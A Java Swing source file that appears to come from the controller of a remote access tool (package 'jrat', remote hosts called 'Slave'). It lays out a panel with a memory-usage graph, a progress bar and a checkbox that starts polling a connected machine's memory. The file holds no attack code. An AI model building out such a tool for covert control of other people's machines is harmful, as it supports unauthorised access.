package jrat.module.system.ui;

import graphslib.smooth.SmoothGraph;
import jrat.api.Resources;
import jrat.api.ui.ClientPanel;
import jrat.controller.Slave;
import jrat.module.system.ThreadMemoryUsage;

import javax.swing.*;
import javax.swing.GroupLayout.Alignment;
import javax.swing.LayoutStyle.ComponentPlacement;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

@SuppressWarnings("serial")
public class PanelMemoryUsage extends ClientPanel {

	private SmoothGraph graph;
    private boolean needRam = false;
	private JProgressBar progressBar;

	public PanelMemoryUsage(Slave slave) {
		super(slave, "Resources", Resources.getIcon("memory"));
		final Slave sl = slave;

		graph = new SmoothGraph();

        JPanel panel = new JPanel();
		panel.setLayout(new BoxLayout(panel, BoxLayout.X_AXIS));
		panel.add(graph);

		JCheckBox chckbxActiveRamMonitor = new JCheckBox("Active usage monitor");
		chckbxActiveRamMonitor.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				JCheckBox src = (JCheckBox) arg0.getSource();
				boolean checked = src.isSelected();
				if (checked) {
					needRam = true;
					new ThreadMemoryUsage(sl).start();
				} else {
					needRam = false;
				}
			}
		});

		progressBar = new JProgressBar();
		progressBar.setStringPainted(true);
		GroupLayout groupLayout = new GroupLayout(this);
		groupLayout.setHorizontalGroup(groupLayout
				.createParallelGroup(Alignment.LEADING)
				.addGroup(
						Alignment.TRAILING,
						groupLayout.createSequentialGroup().addContainerGap().addComponent(chckbxActiveRamMonitor)
								.addPreferredGap(ComponentPlacement.RELATED, 44, Short.MAX_VALUE)
								.addComponent(progressBar, GroupLayout.PREFERRED_SIZE, 431, GroupLayout.PREFERRED_SIZE))
				.addComponent(panel, GroupLayout.DEFAULT_SIZE, 600, Short.MAX_VALUE));
		groupLayout.setVerticalGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(
				Alignment.TRAILING,
				groupLayout
						.createSequentialGroup()
						.addComponent(panel, GroupLayout.DEFAULT_SIZE, 394, Short.MAX_VALUE)
						.addPreferredGap(ComponentPlacement.RELATED)
						.addGroup(
								groupLayout.createParallelGroup(Alignment.BASELINE)
										.addComponent(progressBar, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
										.addComponent(chckbxActiveRamMonitor))));
		setLayout(groupLayout);
	}

	public boolean shouldSend() {
		return needRam;
	}

	public SmoothGraph getGraph() {
		return graph;
	}

	public JProgressBar getProgressBar() {
		return progressBar;
	}
}
